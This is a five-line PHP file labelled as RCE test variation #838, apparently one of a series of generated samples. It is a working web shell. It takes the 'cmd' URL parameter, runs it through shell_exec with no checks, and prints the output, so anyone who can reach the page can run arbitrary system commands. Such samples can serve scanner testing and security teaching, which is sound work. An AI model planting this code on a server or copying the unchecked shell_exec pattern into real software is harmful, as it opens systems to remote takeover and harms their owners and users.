<?php
// RCE test variation #838
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>